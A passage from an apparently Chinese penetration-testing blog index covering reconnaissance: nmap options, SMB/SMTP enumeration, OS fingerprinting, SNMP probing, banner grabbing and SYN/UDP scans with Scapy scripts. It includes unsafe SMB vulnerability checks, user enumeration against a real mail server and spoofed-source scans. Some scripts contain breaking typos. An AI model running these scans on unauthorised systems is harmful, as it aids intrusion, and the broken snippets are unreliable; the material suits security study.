可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><p><strong>时间性能优化</strong></p><pre><code>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--max-retries　　调整重传次数。--min-hostgroup/--max-hostgroup size 　　设置组的大小--min-parallelism/--max-parellelism time　　指定时间内的探针数--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时--scan-delay/-max-scan-delay time 　　指定探针之间的时延--max-retries tries　　指定探针重传转发数--host-timeout time　　设置扫描主机的最大时间--defeat-rst-ratelimit　　设置rst的限制</code></pre><p><strong>其他nmap选项</strong></p><pre><code>-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nmap </tag>
            
            <tag> lbd </tag>
            
            <tag> WAF </tag>
            
            <tag> wafw00f </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMB扫描及SMTP扫描</title>
      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nmap </tag>
            
            <tag> SMB扫描 </tag>
            
            <tag> SMTP扫描 </tag>
            
            <tag> nc </tag>
            
            <tag> nbtscan </tag>
            
            <tag> enum4linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统识别及SNMP扫描</title>
      <link href="/2013/03/22/Information_Gethering/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/"/>
      <url>/2013/03/22/Information_Gethering/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="操作系统识别技术"><a href="#操作系统识别技术" class="headerlink" title="操作系统识别技术"></a><strong>操作系统识别技术</strong></h4></blockquote><ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul><h4 id="TTL起始值"><a href="#TTL起始值" class="headerlink" title="TTL起始值"></a><strong>TTL起始值</strong></h4><p>Windows:128(65–128)<br>    linux/Unix:64(1-64)<br>    某些Unix:255</p><h4 id="Python-Scapy-系统识别"><a href="#Python-Scapy-系统识别" class="headerlink" title="Python Scapy 系统识别"></a><strong>Python Scapy</strong> 系统识别</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">win=<span class="string">"1.1.1.1"</span></span><br><span class="line">linu=<span class="string">"1.1.1.2"</span></span><br><span class="line">aw=sr1(IP(dst=win)/ICMP())</span><br><span class="line">al=sr1(IP(dst=linu)/ICMP())</span><br><span class="line"><span class="keyword">if</span> al[IP].ttl&lt;=<span class="number">64</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"host is Linux"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"host is windows"</span></span><br></pre></td></tr></table></figure><h4 id="Python-ttl-os-py-1-1-1-1"><a href="#Python-ttl-os-py-1-1-1-1" class="headerlink" title="Python ./ttl_os.py     1.1.1.1"></a><strong>Python</strong> <code>./ttl_os.py     1.1.1.1</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./ttl_os.py [IP Address]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./ttl_os.py 1.1.1.1"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will perform ttl analysis to attempt to determine whether the system is Windows or Linux/Unix"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ans=sr1(IP(dst=str(ip))/ICMP(),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> ans==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"No response was returned"</span></span><br><span class="line"><span class="keyword">elif</span> int(ans[IP].ttl)&lt;=<span class="number">64</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Host is Linux/Unix"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Host is Windows"</span></span><br></pre></td></tr></table></figure><h4 id="nmap-使用多种技术识别操作系统"><a href="#nmap-使用多种技术识别操作系统" class="headerlink" title="nmap 使用多种技术识别操作系统"></a><strong>nmap</strong> 使用多种技术识别操作系统</h4><pre><code>nmap 1.1.1.1 -O系统服务特征</code></pre><h4 id="xprobe2"><a href="#xprobe2" class="headerlink" title="xprobe2"></a><strong>xprobe2</strong></h4><pre><code>xprobe2 1.1.1.1结果亦误差</code></pre><h4 id="被动操作系统扫描识别"><a href="#被动操作系统扫描识别" class="headerlink" title="被动操作系统扫描识别"></a><strong>被动操作系统扫描识别</strong></h4><ul><li>IDS</li><li>抓包分析</li></ul><h4 id="p0f-被动扫描"><a href="#p0f-被动扫描" class="headerlink" title="p0f 被动扫描"></a><strong>p0f</strong> 被动扫描</h4><pre><code>p0f结合ARP地址欺骗识别全网OS</code></pre><hr><blockquote><h4 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a><strong>SNMP扫描</strong></h4><p>snmp (简单网络管理协议)<br>    信息的金矿<br>    经常被错误配置<br>    public/prtvate/manager<br>MIB Tree<br>    SNMP Management Information Base (MIB)<br>    树形的网络设备管理功能数据库<br>    1.3.6.1.4.1.77.1.2.25</p></blockquote><h4 id="161"><a href="#161" class="headerlink" title="161"></a><strong>161</strong></h4><pre><code>onesixtyone 1.1.1.1 publiconesixtyone -c clict.txt -i hosts -o my.log -w 100</code></pre><h4 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a><strong>snmpwalk</strong></h4><pre><code>snmpwalk 192.168.254.254 -c public -v 2c用户snmpwalk -c public -v 2c 1.1.1.1 1.3.6.1.4.1.77.1.2.25</code></pre><h4 id="snmpcheck"><a href="#snmpcheck" class="headerlink" title="snmpcheck"></a><strong>snmpcheck</strong></h4><pre><code>snmpcheck -t 192.168.254.254snmpcheck -t 192.168.254.254 -c private -v 2snmpcheck -t 192.168.254.254 -w</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nmap </tag>
            
            <tag> SNMP </tag>
            
            <tag> Scapy </tag>
            
            <tag> p0f </tag>
            
            <tag> snmpcheck </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务扫描识别</title>
      <link href="/2013/03/20/Information_Gethering/%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/"/>
      <url>/2013/03/20/Information_Gethering/%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a><strong>服务扫描</strong></h3><p>识别开放端口上运行的应用<br>识别目标操作系统<br>提高攻击效率<br>    Banner捕获<br>        软件开发商<br>        软件名称<br>        服务类型<br>        版本号<br>            直接发现已知的漏洞和弱点<br>        建立连接后直接获取banner<br>    服务识别<br>        另类服务识别方法<br>        特征行为和响应字段<br>    操作系统识别<br>        不同的响应可用于识别底层操作系统<br>    SNMP分析<br>        简单网络管理协议<br>        Community strings<br>        信息查询或重新配置<br>    防火墙识别<br>        识别和绕过防火墙筛选</p></blockquote><h4 id="NC-服务扫描–Banner"><a href="#NC-服务扫描–Banner" class="headerlink" title="NC 服务扫描–Banner"></a><strong>NC</strong> 服务扫描–Banner</h4><pre><code>nc -nv 1.1.1.1 22</code></pre><h4 id="Python-socket"><a href="#Python-socket" class="headerlink" title="Python socket"></a><strong>Python</strong> socket</h4><pre><code>Socket模块用于连接网络服务</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">bangrab.connect((<span class="string">"1.1.1.1"</span>,<span class="number">21</span>))</span><br><span class="line">bangrab.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="string">"220 (vsFTPd 2.3.4)\r\n"</span></span><br><span class="line">bangrab.close()</span><br><span class="line">exit()</span><br><span class="line">Banner不允许抓取,recv函数无返回将挂起!</span><br></pre></td></tr></table></figure><p><strong>python</strong> <code>./ban_grab.py     192.168.254.254 1 100</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./banner_grab.py [Target -IP ] [First Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./banner_grab.py 1.1.1.1 1 1000"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will grab banners for TCP ports 1 through 100 on 1.1.1.1"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">start=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start,end):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">bangrab=socket.socket(socket.AF_INET,socket_SOCK_STREAM)</span><br><span class="line">bangrab.connect((ip,port))</span><br><span class="line">ready=select.select([bangrab],[],[],<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"TCP Port "</span>+str(port)+<span class="string">"-"</span>+bangrab.recv(<span class="number">4096</span>)</span><br><span class="line">bangrab.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="dmitry–Banner"><a href="#dmitry–Banner" class="headerlink" title="dmitry–Banner"></a><strong>dmitry</strong>–Banner</h4><pre><code>dmitry -p 1.1.1.1dmitry -pb 1.1.1.1</code></pre><h4 id="nmap–Banner"><a href="#nmap–Banner" class="headerlink" title="nmap–Banner"></a><strong>nmap</strong>–Banner</h4><pre><code>nmap -sT 1.1.1.1 -p 22 --script=banner</code></pre><h4 id="amap-Banner"><a href="#amap-Banner" class="headerlink" title="amap-Banner"></a><strong>amap</strong>-Banner</h4><pre><code>amap -B 1.1.1.1 21amap -B 1.1.1.1 1-65535amap -B 1.1.1.1 1-65535 | grep on</code></pre><h4 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a><strong>服务识别</strong></h4><p>Banner信息抓取能力有限<br>nmap响应特征分析识别服务<br>    发送系列复杂的探测<br>    依据相应特征signature</p><h4 id="nc–服务识别"><a href="#nc–服务识别" class="headerlink" title="nc–服务识别"></a><strong>nc</strong>–服务识别</h4><pre><code>nc -nv 1.1.1.1 80</code></pre><h4 id="nmap–服务识别"><a href="#nmap–服务识别" class="headerlink" title="nmap–服务识别"></a><strong>nmap</strong>–服务识别</h4><pre><code>nmap 1.1.1.1 -p 80 -sV</code></pre><h4 id="amap–服务识别"><a href="#amap–服务识别" class="headerlink" title="amap–服务识别"></a><strong>amap</strong>–服务识别</h4><pre><code>amap 1.1.1.1 80amap 1.1.1.1 1-100amap 1.1.1.1 1-100 -qamap 1.1.1.1 1-100 -qb</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nmap </tag>
            
            <tag> nc </tag>
            
            <tag> amap </tag>
            
            <tag> 服务扫描 </tag>
            
            <tag> dmitry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描及僵尸扫描</title>
      <link href="/2013/03/18/Information_Gethering/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2013/03/18/Information_Gethering/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h3><p>端口对应网络服务及应用端程序<br>    服务端程序的漏洞通过端口攻入<br>    发现开放的端口<br>    更具体的攻击面</p></blockquote><h4 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a><strong>UDP端口扫描</strong></h4><p>假设 ICMP port-unreachoble 响应代表端口关闭<br>    目标系统不响应ICMP port-unreachoble时，可能产生误判<br>完整的UDP应用层请求<br>    准确性高<br>    耗时巨大</p><h4 id="Scapy-UDP-Scan"><a href="#Scapy-UDP-Scan" class="headerlink" title="Scapy UDP Scan"></a><strong>Scapy UDP Scan</strong></h4><p>端口关闭：ICMP port-unreachable<br>    端口开放：没有回包<br>    了解每一种基于UDP的应用层包结构很有帮助<br>    与三层相同的技术<br>    误判</p><h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h5><pre><code>sr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=53),timeout=1,verbose=1)</code></pre><p><strong>Python</strong>    <code>./udp_port_scan.py 1.1.1.1 1 100</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./udp_port_scan.py [Target-IP] [First Port] [Last Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./udp_port_scan.py 1.1.1.1 1 100"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will UDP port scan posrts 1 through 100 on 1.1.1.1 "</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">start=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start,end):</span><br><span class="line">a=sr1(IP(dst=ip)/UDP(dport=port),timeout=<span class="number">5</span>,verbose=<span class="number">0</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">print</span> port</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h5 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a><strong>NMAP</strong></h5><pre><code>nmap -sU 1.1.1.1    默认的1000个参数    ICMP host-unreachablenmap 1.1.1.1 -sU -p-nmap -iL iplist.txt -sU -p 1-200</code></pre><h4 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a><strong>TCP端口扫描</strong></h4><p>基于连接在协议<br>三次握手<br>隐蔽扫描–syn<br>    只发syn包，返回syn,ack后，不发最后一个ack，不建立完整连接<br>    应用日志不纪录扫描行为，隐蔽<br>僵尸扫描<br>    极度隐蔽<br>    实施条件苛刻<br>        必须为可伪造源地址<br>        选择僵尸机<br>            闲置系统<br>            系统使用递增的IPID<br>                0<br>                随机<br>    全连接扫描<br>    所有的TCP扫描方式，都是基于三次握手的变化来判断目标端口状态</p><h4 id="隐蔽扫描–syn"><a href="#隐蔽扫描–syn" class="headerlink" title="隐蔽扫描–syn"></a><strong>隐蔽扫描–syn</strong></h4><p>Syn–syn/ack–rst</p><p><strong>Scapy</strong></p><pre><code>sr1(IP(dst=&quot;192.168.254.254&quot;)/TCP(flags=&quot;S&quot;,dport=22),timeout=1,verbose=0)sr1(IP(dst=&quot;192.168.254.254&quot;)/TCP(flags=&quot;S&quot;),timeout=1,verbose=1)#默认80端口</code></pre><p><strong>python</strong> <code>./tcp_syn_scan.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./syn_port_scan.py [Target-IP] [First Port] [Last Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./syn_port_scan.py 1.1.1.1 1 100"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will TCP port scan posrts 1 through 100 on 1.1.1.1 "</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">start=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start,end):</span><br><span class="line">a=sr1(IP(dst=ip)/TCP(dport=port),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> int(a[TCP],flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> port</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="Nmap-syn半连接隐蔽端口扫描"><a href="#Nmap-syn半连接隐蔽端口扫描" class="headerlink" title="Nmap syn半连接隐蔽端口扫描"></a><strong>Nmap</strong> syn半连接隐蔽端口扫描</h4><pre><code>nmap -sS 1.1.1.1 -p 80,21,25,110,443nmap -sS 1.1.1.1 -p 1-65535 --open        or    nmap -sS 1.1.1.1 -p- --opennmap -sS -iL iplist.txt -p 80,21,25,110</code></pre><h4 id="hping3-syn半连接隐蔽端口扫描"><a href="#hping3-syn半连接隐蔽端口扫描" class="headerlink" title="hping3    syn半连接隐蔽端口扫描"></a><strong>hping3</strong>    syn半连接隐蔽端口扫描</h4><pre><code>hping3 1.1.1.1 --scan 80 -Shping3 1.1.1.1 --scan 80,21,25,443 -Shping3 1.1.1.1 --scan 0-65535 -Shping3 -c 10 -S --spoof 1.1.1.1 -p ++1 192.168.254.254 #伪造源地址，欺骗扫描</code></pre><h4 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a><strong>全连接端口扫描</strong></h4><p>Syn扫描不需要raw packets<br>    内核认为syn/ack是非法包，直接发rst中断连接<br>    全连接扫描对scapy比较困难<br>    结果最准确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Scapy</span><br><span class="line">sr1(IP(dst&#x3D;&quot;192.168.254.254&quot;)&#x2F;TCP(dport&#x3D;22,flags&#x3D;&quot;S&quot;))</span><br><span class="line">.&#x2F;tcp_scan1.py</span><br><span class="line">.&#x2F;tcp_scan2.py</span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.254.254 -j DROP #增加一条内核防火墙出站规则</span><br></pre></td></tr></table></figure><h4 id="nmap-全连接端口扫描"><a href="#nmap-全连接端口扫描" class="headerlink" title="nmap 全连接端口扫描"></a><strong>nmap</strong> 全连接端口扫描</h4><pre><code>nmap -sT 1.1.1.1 -p 80nmap -sT 1.1.1.1 -p 80,21,25nmap -sT 1.1.1.1 -p 80-2000nmap -sT -iL iplist.txt  #默认1000个常用端口</code></pre><h4 id="dmitry-全连接端口扫描"><a href="#dmitry-全连接端口扫描" class="headerlink" title="dmitry    全连接端口扫描"></a><strong>dmitry</strong>    全连接端口扫描</h4><p>功能简单，但使用简便<br>默认150个最常用端口</p><pre><code>dmitry -p 1.1.1.1dmitry -p 1.1.1.1 -o output #输出到文件</code></pre><h4 id="nc-全连接端口扫描"><a href="#nc-全连接端口扫描" class="headerlink" title="nc 全连接端口扫描"></a><strong>nc</strong> 全连接端口扫描</h4><pre><code>nc -nv -w 1 